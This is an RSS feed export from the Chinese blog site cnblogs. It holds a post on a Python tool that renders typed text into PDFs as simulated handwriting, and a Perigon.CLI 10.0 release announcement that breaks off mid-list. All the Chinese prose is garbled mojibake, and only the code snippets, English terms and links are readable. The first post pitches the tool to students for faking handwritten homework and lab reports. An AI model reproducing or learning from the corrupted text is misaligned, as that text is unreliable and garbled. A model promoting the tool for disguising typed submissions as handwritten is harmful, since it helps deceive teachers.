<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-01T08:23:51.141Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ å®ç¨ç¨åºï¼è§£æ¾åæï¼Python æé  PDF æåæ¨¡æå¨ï¼è½»æ¾æå®æåä½ä¸ ]]></title>
    <link>https://www.cnblogs.com/ChenAI-TGF/p/19430267</link>
    <guid>3048b8d5024ec9926629b5cf93ef5a31</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ChenAI-TGF/p/19430267" title="åå¸äº 2026-01-01 15:59">
    <span role="heading" aria-level="2">å®ç¨ç¨åºï¼è§£æ¾åæï¼Python æé  PDF æåæ¨¡æå¨ï¼è½»æ¾æå®æåä½ä¸</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ¬æä»ç»äºä¸æ¬¾åºäºPythonå¼åçPDFæåæ¨¡æå·¥å·ï¼å¯èªå¨å°çµå­ææ¬è½¬æ¢ä¸ºé¼çæåææå¹¶å¡«åè³PDFæå®åºåãè¯¥å·¥å·æ¯æä¸­è±æç¬ç«éç½®å­ä½ãå¤§å°ãé¢è²ç­åæ°ï¼éè¿éæºæ°å¨ç®æ³æ¨¡æçå®æåçè¡å¾æãå­ç¬¦åç§»ç­ä¸è§åç¹æ§ãç¨æ·å¯éè¿å¯è§åçé¢æ¡éå¡«ååºåãå®æ¶é¢è§ææå¹¶ä¿å­éç½®æ¨¡æ¿ãææ¯å®ç°éç¨PyMuPDFå¤çPDFæ ¸å¿æä½ï¼ç»åtkinteræå»ºGUIçé¢ï¼Pillowå®ç°å¾åæ¸²æãå¼æºé¡¹ç®å°åå·²æä¾ï¼å¯å¸®å©å­¦çé«æå®ææåä½ä¸éæ±ï¼æ¾èæåå·¥ä½æçã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="åè¨">åè¨</h1>
<p>ä½ä¸ºå­¦çï¼æ³å¿å¤§å®¶é½æè¿è¢«æµ·éæåå®éªæ¥åãè¯¾ç¨ä½ä¸æ¯éççè¦ãè¦è±è´¹å¤§éæ¶é´ä¸ç¬ä¸åå°æåå°çº¸è´¨ææ¡£ä¸­åè¿è¡æ«ææpdfæäº¤ï¼ä¸ä»èæ¶èåï¼æåçå­è¿¹è¿å¯è½åå·®ä¸é½ï¼å½±åä½ä¸ç¾è§åº¦ã</p>
<p>ä¸ºäºå·æï¼åä¸»å¼åäºä¸æ¬¾åºäºpythonçPDFæåæ¨¡æå¨ï¼å®è½å¤æ¨¡æçå®æåç¬è¿¹ï¼å°çµèä¸çæå­æ¹éå¡«åå° PDF æå®åºåï¼æ¯æä¸­æ/è±æåå¼éç½®ãæåæ°å¨ææèªå®ä¹ãéç½®æ¨¡çå¤ç¨ç­åè½ï¼çæçææé«åº¦è´´è¿çå®æåï¼å¸®ä½ å½»åºåå«æå¨æåçç¦æ¼ãé¦åæ¥ä¸ªçé¢ä»¥åææé¢è§ï¼</p>
<p><strong>ä»£ç å·²ç»å¼æºå¨Githubï¼<a href="https://github.com/ChenAI-TGF/PDF_HandWrite" target="_blank" rel="noopener nofollow">https://github.com/ChenAI-TGF/PDF_HandWrite</a><br>
æ¬¢è¿å¤§å®¶ä¸è½½ï¼å¦æè§å¾æç¨çè¯å¯ä»¥ç»æç¹ä¸ªStarï¼ä¸åæè°¢ï¼ï¼<br>
å¦æç»ä¸ä¸Githubçè¯ä¹æ¬¢è¿ç´æ¥ç§ä¿¡åä¸»è¦ä»£ç </strong></p>
<p><img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838677-1193143111.png" class="lazyload"></p>
<h2 id="æµç¨æè·¯æ»è§">æµç¨æè·¯æ»è§</h2>
<p>è¿æ¬¾ PDF æåæ¨¡æå¨çæ´ä½è¿ä½æµç¨å¯ä»¥åä¸ºãç¨æ·æä½æµç¨ãåãææ¯å®ç°æµç¨ãä¸¤å±ï¼æ¸æ°ææï¼</p>
<h2 id="1--ç¨æ·æä½æµç¨ç®åæä¸æ">1.  ç¨æ·æä½æµç¨ï¼ç®åæä¸æï¼</h2>
<ol>
<li>
<p>æå¼ç®æ  PDFï¼éæ©éè¦å¡«åçå®éªæ¥åãä½ä¸ç­ PDF æä»¶ï¼<br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838708-921000655.png" class="lazyload"><br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838676-1025376165.png" class="lazyload"></p>
</li>
<li>
<p>æ¡éå¡«ååºåï¼å¨ PDF é¢è§çé¢æå¨é¼ æ ï¼æ¡éåºéè¦æå¥æå­çåºåï¼çº¢è²ç©å½¢æ è®°ï¼ï¼<br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838596-891684840.png" class="lazyload"></p>
</li>
<li>
<p>éç½®æååæ°ï¼åå«å¨ä¸­æãè±æ/æ°å­éé¡¹å¡ä¸­è°æ´å­ä½ãå¤§å°ãé¢è²ãæ°å¨ææç­åæ°ï¼<br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838701-1274364534.png" class="lazyload"></p>
</li>
<li>
<p>è¾å¥å¹¶é¢è§æå­ï¼å¨å³ä¾§ææ¬æ¡è¾å¥éè¦å¡«åçåå®¹ï¼å¼å¯ãå®æ¶é¢è§ãæ¥çæåææï¼<br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838679-1622199992.png" class="lazyload"><br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838677-1193143111.png" class="lazyload"></p>
</li>
<li>
<p>ä¸æ»¡æå¯å®æ¶è°æ´åæ°<br>
<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838590-1838260486.png" class="lazyload"></p>
</li>
<li>
<p>ç¡®è®¤å¹¶ä¿å­ï¼æææ»¡æåç¡®è®¤åºç¨ç¬è¿¹ï¼æ¯ææ¤éãæ¦é¤éè¯¯åå®¹ï¼ä¹å¯ä¿å­å½åéç½®ä¸ºæ¨¡çï¼æåå¯¼åºå¡«åå®æç PDFã</p>
</li>
</ol>
<p><img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838617-625766259.png" class="lazyload"></p>
<h3 id="2--ææ¯å®ç°æµç¨åå±åä½">2.  ææ¯å®ç°æµç¨ï¼åå±åä½ï¼</h3>
<ol>
<li>UI äº¤äºå±ï¼åºäº tkinter æ­å»ºå¯è§åçé¢ï¼æä¾æé®ãéé¡¹å¡ãææ¬æ¡ç­äº¤äºç»ä»¶ï¼æ¥æ¶ç¨æ·æä½ï¼</li>
<li>åæ°éç½®å±ï¼ç®¡çä¸­æ/è±ææååæ°ï¼æ¯æéç½®ä¿å­ï¼JSONï¼ä¸å è½½ï¼å®ç°æ¨¡çå¤ç¨ï¼</li>
<li>PDF æä½å±ï¼åºäº PyMuPDF å®ç° PDF çè¯»åãé¡µé¢æ¸²æãæå­æå¥ãæ¦é¤ãä¿å­ç­æ ¸å¿æä½ï¼</li>
<li>æåæ¸²æå±ï¼æ ¸å¿é»è¾å±ï¼å®ç°æå­æçãè¯­è¨åºåãæåæ°å¨ææçæï¼æç»å°æ¨¡ææåæå­æå¥ PDFã</li>
</ol>
<pre><code class="language-bash">âââââââââââââââââââââââ
â  UIäº¤äºå±ï¼tkinterï¼ â  # å¯è§åäº¤äºï¼æ¥æ¶æä½
âââââââââââââââ¬ââââââââ
              â¼
âââââââââââââââââââââââ
â  åæ°éç½®å±ï¼JSONï¼  â  # åæ°ç®¡çï¼æ¨¡çå¤ç¨
âââââââââââââââ¬ââââââââ
              â¼
âââââââââââââââââââââââ
â PDFæä½å±ï¼PyMuPDFï¼ â  # PDFæ ¸å¿æä½ï¼è¯»å/ä¿å­ç­ï¼
âââââââââââââââ¬ââââââââ
              â¼
âââââââââââââââââââââââ
â  æåæ¸²æå±ï¼æ ¸å¿ï¼  â  # æåææçæï¼æå­æå¥
âââââââââââââââââââââââ
</code></pre>
<h1 id="æ¶åçå·ä½ææ¯">æ¶åçå·ä½ææ¯</h1>
<p>è¿æ¬¾å·¥å·åºäº Python çæçå¸¸ç¨åºå¼åï¼ææ¯æ è½»éåä¸å®ç¨æ§å¼ºï¼æ ¸å¿æ¶åä»¥ä¸ææ¯ï¼</p>
<ol>
<li><strong>tkinter</strong>ï¼Python åç½® GUI åºï¼æ éé¢å¤å®è£ï¼è´è´£æ­å»ºæ´ä¸ªåºç¨çå¯è§åçé¢ï¼å®ç°æé®ç¹å»ãåæ°è°æ´ãææ¬è¾å¥ãPDF é¢è§ç­äº¤äºåè½ï¼</li>
<li><strong>PyMuPDFï¼fitzï¼</strong>ï¼æ ¸å¿ PDF å¤çåºï¼æä¾é«æç PDF è¯»åãåå¥ãé¡µé¢æ¸²æãæå­æå¥ãçº¢actæ æ³¨ï¼æ¦é¤åè½ï¼ç­æ¥å£ï¼æ¯å®ç° PDF ç¼è¾çæ ¸å¿ä¾èµï¼</li>
<li><strong>Pillowï¼PILï¼</strong>ï¼å¾åå¤çåºï¼å° PyMuPDF æ¸²æåºç PDF é¡µé¢åç´ æ°æ®ï¼è½¬æ¢æ tkinter ç»å¸å¯æ¾ç¤ºçå¾åæ ¼å¼ï¼å®ç° PDF é¡µé¢çå¯è§åé¢è§ï¼</li>
<li><strong>JSON</strong>ï¼è½»éçº§æ°æ®æ ¼å¼ï¼ç¨äºä¿å­ç¨æ·éç½®çæååæ°æ¨¡çï¼å­ä½ãå¤§å°ãæ°å¨å¼ç­ï¼ï¼æ¹ä¾¿åç»­ç´æ¥å¤ç¨ï¼æ ééå¤è°æ´ï¼</li>
<li><strong>Python éæºæ°ä¸æ°å­¦è®¡ç®</strong>ï¼å®ç°æåææçãä¸è§åæ°å¨ãï¼æ¨¡æçå®æåçä½ç½®åç§»ãå¤§å°æ³¢å¨ãè¡å¾æç­ç¹æ§ï¼</li>
<li><strong>TTF å­ä½æ¯æ</strong>ï¼è¯»åèªå®ä¹ TrueType å­ä½æä»¶ï¼æ¯æåæ¢ä¸åæåé£æ ¼å­ä½ï¼ééä¸åç¨æ·çæåä¹ æ¯ã</li>
</ol>
<h1 id="æç»æææ¼ç¤º">æç»æææ¼ç¤º</h1>
<p><img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838731-394297387.png" class="lazyload"></p>
<h1 id="ä»£ç åçç®åè®²è§£æåå­ä½çæ--æ°å¨ææ">ä»£ç åçç®åè®²è§£ï¼æåå­ä½çæ + æ°å¨ææï¼</h1>
<p>æä»¬éç¹è®²è§£æ ¸å¿åè½ ââ æåå­ä½çæä¸æ°å¨ææçå®ç°ï¼å¿½ç¥ UI æ­å»ºç­è¾å©ä»£ç ï¼èç¦æ ¸å¿é»è¾ï¼</p>
<h2 id="ä¸-æåå­ä½çææå­æå¥-pdf-æ ¸å¿">ä¸ã æåå­ä½çæï¼æå­æå¥ PDF æ ¸å¿ï¼</h2>
<p>è¿é¨åçæ ¸å¿æ¯å°æå­æè§åæçåï¼æå¥å° PDF æå®åºåï¼å³é®æ­¥éª¤å¦ä¸ï¼</p>
<ol>
<li>
<p><strong>æå­ä¸åºåé¢å¤ç</strong><br>
é¦åè·åææ¬æ¡ä¸­çè¾å¥æå­ï¼ææ¢è¡ç¬¦ <code>\n</code> åå²æå¤è¡ï¼åæ¶å°ç¨æ·æ¡éçé¢è§åºååæ ï¼å¸¦ç¼©æ¾æ¯ä¾ï¼è½¬æ¢ä¸º PDF å®éåæ ï¼é¤ä»¥ç¼©æ¾ç³»æ° <code>self.zoom</code>ï¼ï¼å¾å°çå®çå¡«åèå´ <code>(x1, y1, x2, y2)</code>ã</p>
<pre><code class="language-python"># è¯»åè¾å¥æå­å¹¶åå²è¡
text = self.text_editor.get("1.0", tk.END).strip("\n")
lines = text.split('\n')
# è½¬æ¢ä¸º PDF å®éåæ ï¼å»é¤é¢è§ç¼©æ¾å½±åï¼
x1, y1 = min(self.start_x, self.end_x)/self.zoom, min(self.start_y, self.end_y)/self.zoom
x2, y2 = max(self.start_x, self.end_x)/self.zoom, max(self.start_y, self.end_y)/self.zoom
</code></pre>
</li>
<li>
<p><strong>è¯­è¨åºåä¸åæ°å¹é</strong><br>
éè¿ <code>is_chinese</code> å½æ°å¤æ­åä¸ªå­ç¬¦æ¯ä¸­æè¿æ¯è±æ/æ°å­ï¼åå«å¹éå¯¹åºçéç½®åæ°ï¼ä¸­æ/è±æç¬ç«çå­ä½ãå¤§å°ãå­è·ç­ï¼ï¼ç¡®ä¿ä¸åè¯­è¨çæåææééåçã</p>
<pre><code class="language-python"># å¤æ­æ¯å¦ä¸ºä¸­æï¼å«ä¸­ææ ç¹ï¼
def is_chinese(self, char):
    if '\u4e00' &lt;= char &lt;= '\u9fff': return True
    if char in "ãï¼ãï¼ï¼ï¼ï¼ââââï¼ï¼ãããã": return True
    return False

# éåå­ç¬¦æ¶å¹éå¯¹åºè¯­è¨åæ°
lang = 'zh' if self.is_chinese(char) else 'en'
p = self.params[lang]  # è·åå¯¹åºè¯­è¨çéç½®åæ°
</code></pre>
</li>
<li>
<p><strong>PDF æå­æå¥æ ¸å¿ API</strong><br>
ä½¿ç¨ PyMuPDF ç <code>page.insert_text</code> æ¹æ³å®ç°æå­æå¥ï¼è¿æ¯æåå­ä½çæçå³é®ï¼æ ¸å¿åæ°è¯´æå¦ä¸ï¼</p>
<ul>
<li><code>fitz.Point(final_x, final_y)</code>ï¼æå­çå®éæå¥åæ ï¼ç»æçåæ°å¨è°æ´åï¼ï¼</li>
<li><code>char</code>ï¼è¦æå¥çåä¸ªå­ç¬¦ï¼éå­ç¬¦æå¥å®ç°ç²¾ç»æçï¼ï¼</li>
<li><code>fontsize</code>ï¼å­ç¬¦çå®éå¤§å°ï¼å¸¦å¤§å°æå¨ï¼ï¼</li>
<li><code>fontfile</code>ï¼TTF æåå­ä½æä»¶è·¯å¾ï¼å³å®å­ä½é£æ ¼ï¼</li>
<li><code>color</code>ï¼æå­é¢è²ï¼é»è®¤çº¯é»ï¼æ¯æç¨æ·èªå®ä¹ï¼ï¼</li>
<li><code>morph</code>ï¼åæ¢ç©éµï¼å®ç°å­ç¬¦æè½¬ææï¼å å è¡å¾æä¸å­ç¬¦æè½¬æå¨ï¼ã</li>
</ul>
</li>
<li>
<p><strong>è¡ä¸å­ç¬¦æç</strong><br>
æè¡éåæå­ï¼éå­ç¬¦è®¡ç®æå¥åæ ï¼å¤çç©ºæ ¼ï¼åç¬é¢çé´è·ï¼ï¼å½å­ç¬¦æ¨ªåæ è¶åºæ¡éåºåå³ä¾§æ¶èªå¨æ¢è¡ï¼åæ¶æ ¹æ®ãè¡è·åæ°ãè°æ´ä¸ä¸è¡ççºµåæ ï¼ç¡®ä¿æå­æçè§æ´ä¸ä¸è¶åºæ¡éèå´ã</p>
</li>
</ol>
<h2 id="äº-æ°å¨ææå®ç°æ¨¡æçå®æåä¸è§åæ§">äºã æ°å¨ææå®ç°ï¼æ¨¡æçå®æåä¸è§åæ§ï¼</h2>
<p>è¿æ¯å·¥å·ççµé­æå¨ï¼éè¿ãè¡çº§æ°å¨ãåãå­ç¬¦çº§æ°å¨ãä¸¤å±ææï¼å½»åºæè±æå°ä½çè§æ´æï¼è´´è¿çå®æåï¼å¯¹åºä»£ç ä¸­çéç½®åæ°ï¼</p>
<ol>
<li>
<p><strong>è¡çº§æ°å¨ï¼æ´è¡ä¸è§åæ§ï¼</strong><br>
éå¯¹æ¯ä¸è¡æå­ï¼æ·»å æ´ä½çåç§»åå¾æï¼æ¨¡ææåæ¶ãè¡ä¸ç´ãç¥æåç§»ãçç¹ç¹ï¼å¯¹åºä¸ä¸ªåæ°ï¼</p>
<ul>
<li>è¡å·¦å³å¹³ç§»ï¼<code>line_jitter_x</code>ï¼ï¼éæºçæ <code>-line_jitter_x ~ line_jitter_x</code> èå´åçåç§»é <code>line_dx</code>ï¼ä½¿æ¯è¡æå­å·¦å³è½»å¾®æå¨ï¼</li>
<li>è¡ä¸ä¸å¹³ç§»ï¼<code>line_jitter_y</code>ï¼ï¼éæºçæ <code>-line_jitter_y ~ line_jitter_y</code> èå´åçåç§»é <code>line_dy</code>ï¼ä½¿è¡ä¸è¡ä¹é´çé´è·ç¥æå·®å¼ï¼</li>
<li>è¡æ´è¡å¾æï¼<code>line_tilt</code>ï¼ï¼éæºçæå¾æè§åº¦ <code>line_angle_deg</code>ï¼è½¬æ¢ä¸ºå¼§åº¦åï¼éè¿ <code>tilt_y_offset = (curr_x - line_start_x) * math.tan(line_angle_rad)</code> è®¡ç®æ¯ä¸ªå­ç¬¦çYè½´åç§»ï¼å®ç°æ´è¡è½»å¾®å¾æã</li>
</ul>
<pre><code class="language-python"># è¡çº§æ°å¨åæ°è®¡ç®
line_dx = random.uniform(-p_line['line_jitter_x'].get(), p_line['line_jitter_x'].get())
line_dy = random.uniform(-p_line['line_jitter_y'].get(), p_line['line_jitter_y'].get())
line_angle_deg = random.uniform(-p_line['line_tilt'].get(), p_line['line_tilt'].get())
line_angle_rad = math.radians(line_angle_deg)
</code></pre>
</li>
<li>
<p><strong>å­ç¬¦çº§æ°å¨ï¼åä¸ªå­ç¬¦ä¸è§åæ§ï¼</strong><br>
éå¯¹æ¯ä¸ªå­ç¬¦ï¼æ·»å ä½ç½®ãå¤§å°ãæè½¬çç»å¾®å·®å¼ï¼æ¨¡ææåæ¶ãæ¯ä¸ªå­å¤§å°ä¸ä¸ãç¥ææå¨ãçç¹ç¹ï¼å¯¹åºä¸ä¸ªåæ°ï¼</p>
<ul>
<li>å­ä½ç½®æå¨ï¼<code>jitter_pos</code>ï¼ï¼éæºçæ <code>(-jitter_pos ~ jitter_pos)</code> çXãYåç§»éï¼ä½¿å­ç¬¦è±ç¦»ä¸¥æ ¼çæ°´å¹³å¯¹é½ï¼</li>
<li>å­å¤§å°æå¨ï¼<code>jitter_size</code>ï¼ï¼å¨åºç¡å­ä½å¤§å°ä¸ï¼éæºå¢å <code>(-jitter_size ~ jitter_size)</code> çæ°å¼ï¼çæ <code>char_jitter_fs</code>ï¼ä½¿å­ç¬¦å¤§å°ç¥æå·®å¼ï¼</li>
<li>å­æè½¬æå¨ï¼<code>jitter_rot</code>ï¼ï¼éæºçæ <code>(-jitter_rot ~ jitter_rot)</code> çæè½¬è§åº¦ï¼å å è¡å¾æè§åº¦åï¼éè¿ <code>morph</code> åæ°å®ç°å­ç¬¦è½»å¾®æè½¬ã</li>
</ul>
<pre><code class="language-python"># å­ç¬¦çº§æ°å¨åæ°è®¡ç®
char_jitter_x = random.uniform(-p['jitter_pos'].get(), p['jitter_pos'].get())
char_jitter_y = random.uniform(-p['jitter_pos'].get(), p['jitter_pos'].get())
char_jitter_rot = random.uniform(-p['jitter_rot'].get(), p['jitter_rot'].get())
char_jitter_fs = f_size + random.uniform(-p['jitter_size'].get(), p['jitter_size'].get())
</code></pre>
</li>
<li>
<p><strong>éæºæ°æ§å¶ï¼é¢è§ç¨³å® + å®ééæºï¼</strong><br>
ä¸ºäºä¿è¯å®æ¶é¢è§æ¶ææç¨³å®å¯è°æ´ï¼è®¾ç½®éæºæ°ç§å­ <code>random.seed(42)</code> åºå®æ°å¨ææï¼å®éåºç¨ç¬è¿¹æ¶ï¼ä¸è®¾ç½®ç§å­ <code>random.seed()</code>ï¼çæéæºçæ°å¨ææï¼è®©æ¯æ¬¡çæçæåé£æ ¼ç¥æå·®å¼ï¼æ´è´´è¿çå®åºæ¯ã</p>
<pre><code class="language-python">if is_preview: random.seed(42)  # é¢è§æ¨¡å¼ï¼åºå®éæºæ°ï¼ææç¨³å®
else: random.seed()  # å®éçæï¼éæºç§å­ï¼æææ´çå®
</code></pre>
</li>
</ol>
<h1 id="æ»ç»">æ»ç»</h1>
<p>è¿æ¬¾ PDF æåæ¨¡æå¨å®ç¾è§£å³äºæåä½ä¸ãå®éªæ¥åççç¹ï¼å¼å·ãå®ç¨æ§ãåãçµæ´»æ§ãï¼</p>
<ol>
<li><strong>å®ç¨æ§ææ»¡</strong>ï¼æ éæå¨æåï¼ä¸é®çææåé£æ ¼ PDFï¼èçå¤§éæ¶é´åç²¾åï¼çæææé«åº¦è´´è¿çå®æåï¼</li>
<li><strong>èªå®ä¹æ§å¼º</strong>ï¼ä¸­æ/è±æç¬ç«éç½®ï¼æ¯æå­ä½ãé¢è²ãå¤§å°ãå­è·è¡è·è°æ´ï¼å¤å±æ°å¨åæ°å¯ç²¾ç»è°æ§æåé£æ ¼ï¼</li>
<li><strong>æä½ä¾¿æ·</strong>ï¼å¯è§åçé¢åå¥½ï¼æ¯æå®æ¶é¢è§ãæ¤éãæ¦é¤ãæ¨¡çå¤ç¨ï¼é¶åºç¡ç¨æ·ä¹è½å¿«éä¸æï¼</li>
<li><strong>ææ¯è½»éå</strong>ï¼åºäº Python å¸¸ç¨åºå¼åï¼æ éå¤æç¯å¢éç½®ï¼ä»£ç å¯çµæ´»ä¿®æ¹æ©å±ã</li>
</ol>
<p>å½ç¶ï¼è¿æ¬¾å·¥å·è¿æä¼åç©ºé´ï¼æ¯å¦æ¯æè¿ç¬ææãç¬è¿¹ç²ç»ååãæ¹éå¤çå¤ä¸ª PDF ç­ãå¦æå¤§å®¶æç±»ä¼¼éæ±ï¼å¯ä»¥åºäºè¿ä»½ä»£ç è¿è¡äºæ¬¡å¼åï¼ééèªå·±çä½¿ç¨åºæ¯ãå¸æè¿æ¬¾å·¥å·è½å¸®å¤§å®¶è§£æ¾åæï¼ææ´å¤æ¶é´æå¥å°æ ¸å¿å­¦ä¹ åç ç©¶ä¸­ï¼</p>
<p><strong>ä»£ç å·²ç»å¼æºå¨Githubï¼<a href="https://github.com/ChenAI-TGF/PDF_HandWrite" target="_blank" rel="noopener nofollow">https://github.com/ChenAI-TGF/PDF_HandWrite</a><br>
æ¬¢è¿å¤§å®¶ä¸è½½ï¼å¦æè§å¾æç¨çè¯å¯ä»¥ç»æç¹ä¸ªStarï¼ä¸åæè°¢ï¼ï¼<br>
å¦æç»ä¸ä¸Githubçè¯ä¹æ¬¢è¿ç´æ¥ç§ä¿¡åä¸»è¦ä»£ç </strong></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-01 15:59">2026-01-01 15:59</span>&nbsp;
<a href="https://www.cnblogs.com/ChenAI-TGF">TTGF</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19430267);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19430267', targetLink: 'https://www.cnblogs.com/ChenAI-TGF/p/19430267', title: 'å®ç¨ç¨åºï¼è§£æ¾åæï¼Python æé  PDF æåæ¨¡æå¨ï¼è½»æ¾æå®æåä½ä¸' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Perigon.CLI 10.0 éç£åå¸ãAspNetCoreå¼åæ¨¡æ¿åè¾å©å·¥å·ã ]]></title>
    <link>https://www.cnblogs.com/msdeveloper/p/19430150/perigon-10-announce</link>
    <guid>678def56674aa7e7bf91f4677b932fd9</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/msdeveloper/p/19430150/perigon-10-announce" title="åå¸äº 2026-01-01 15:18">
    <span role="heading" aria-level="2">Perigon.CLI 10.0 éç£åå¸ãAspNetCoreå¼åæ¨¡æ¿åè¾å©å·¥å·ã</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="-perigoncli-100-éç£åå¸">ð Perigon.CLI 10.0 éç£åå¸</h1>
<p><img src="https://img2024.cnblogs.com/blog/1074783/202601/1074783-20260101151334306-54452182.png" alt="perigon_logo320" loading="lazy"></p>
<p>æä»¬å¾é«å´å°å®£å¸ï¼Perigon.CLI 10.0 ç°å·²æ­£å¼åå¸ï¼æ­¤æ¬¡æ´æ°å¸¦æ¥äºä¼å¤ä»¤äººå´å¥çæ°åè½åæ¹è¿ï¼æ¨å¨æåå¼åèççäº§ååå¼åä½éªã</p>
<p>ç®èè¨ä¹ï¼Perigonæ¯å´ç»<code>Aspire/AspNetCore/EF Core</code>ç­ç¸å³ææ¯æ çå¼åè¾å©å·¥å·ï¼å¸®å©ä½ å¿«éæå»ºå¯ç»´æ¤çé¡¹ç®ï¼å®ä¸»è¦æä¾ï¼</p>
<ul>
<li><strong>é¡¹ç®èææ¶</strong>ï¼éè¿è§£å³æ¹æ¡æ¨¡æ¿(Perigon.templates)ï¼å¿«éåå»ºç¬¦åæä½³å®è·µçé¡¹ç®ç»æã</li>
<li><strong>ä»£ç çæå¨</strong>ï¼æä¾WebUIçé¢ï¼ç¨æ¥éè¿å®ä½æ¥çæå¯¹åºçå¢å æ¹æ¥ä»£ç ï¼ä»¥åå®¢æ·ç«¯è¯·æ±æå¡ççæï¼æå¤§åå°éå¤å³å¨ï¼åæ¶æä¾èªå®ä¹æ¨¡æ¿åè½ï¼æ»¡è¶³ä¸åé¡¹ç®éæ±ã</li>
<li><strong>MCP</strong>: æä¾MCPæ¯æï¼ä»¥ä¸ç°æIDEä¸­çAIéæã</li>
<li><strong>å½ä»¤è¡å·¥å·</strong>ï¼ç¨æ¥åå»ºè§£å³æ¹æ¡/å¯å¨WebUI/çæå®¢æ·ç«¯è¯·æ±æå¡ç­ã</li>
</ul>
<h2 id="ç±æ¥">ç±æ¥</h2>
<p>æåï¼å®åªæ¯æä¸ªäººå¨å¼åååç«¯é¡¹ç®æ¶ï¼ä¸ºäºåå°éå¤å³å¨èå¼åçç®åçé¡¹ç®åå±èææ¶åä»£ç çæå·¥å·ãå½æ¶(2020å¹´)å®å«<code>GT.CLI</code>å<code>GT.Framework.Web</code>ã</p>
<p>2021å¹´ï¼éæäºç»æï¼å¹¶å¼å§å¨å¢éé¡¹ç®ä¸­ä½¿ç¨ï¼æ¨¡æ¿æ¹åä¸º<code>ater.web.templates</code>ï¼CLIå·¥å·ä¹ç»è¿ä¸¤æ¬¡å¤§æ¹ï¼åå«ä¸º<code>ater.droplet.cli</code>å<code>ater.dry</code>ï¼å®å å¥äºä¸äºå¬å¸åé¡¹ç®éæ±çåè½ï¼å¦æä¾æ´å¤å¼ç®±å³ç¨çæ¨¡åã</p>
<blockquote>
<p>[!TIP]<br>
ä»¥ä¸å·¥å·å¯å¨<code>nuget</code>ä¸­æ¾å°ï¼ä½é½ä¸åç»´æ¤ã</p>
</blockquote>
<h2 id="-ç°å¨">â¨ ç°å¨</h2>
<p>2025å¹´.NET10åå¸ï¼å¨å¹´åï¼æå¼å§è®¡åè¿è¡å¨é¢çéæåä¼åï¼æä¾ä¸ä¸ªå¨æ°ççæ¬ï¼å®å¨åºäº.NET10ï¼ä¸åå¼å®¹ä¹åççæ¬ï¼ç»è¿æ°æçå¼ååæµè¯ï¼æç»åå¸äº<code>Perigon.CLI</code>å<code>Perigon.templates</code>ï¼è¯¥çæ¬ä¸»è¦çç¹ç¹åæ¬ï¼</p>
<ul>
<li>
<p>æä½çé¢ä»<code>Angular</code>æ¹ä¸º<code>Blazer server</code>ï¼ä½¿ç¨<code>fluent-ui</code>ç»ä»¶åºï¼ä»ææ¯å°è§è§ä¸é½æ´è´´è¿<code>NET</code>çæã</p>
</li>
<li>
<p>å¨é¡¹ç®ç»æä¸ï¼å»å¤æåï¼æ´å éç¨ãå»é¤äºä»¥ä¸è®¾è®¡</p>
<ul>
<li><code>ä»å¨æ¨¡å¼</code></li>
<li>é»è®¤ä½¿ç¨<code>QueryDbContext</code>å<code>CommandDbContext</code>çè®¾è®¡ï¼éè¦å¤ä¸å±DataAccessæ¥æ½è±¡ã</li>
<li>é»è®¤çæä¸å¡æ¥å£ç±»</li>
<li><code>[Module]</code>ç¹æ§ï¼ç´æ¥ä½¿ç¨ç®å½ç»ææ¥åºåæ¨¡å</li>
<li>å¶ä»ä¸å¿è¦çæ½è±¡åå¤æè®¾è®¡</li>
</ul>
</li>
<li>
<p>éæé¡¹ç®ç»æï¼å¹¶æ·»å äºæ´å¤éç¨åå®ç¨çåè½</p>
<ul>
<li>å¼å¥Aspireï¼è§£å³å¼åç¯å¢åºç¡è®¾æ½åå¤æå¡æ¯æé®é¢</li>
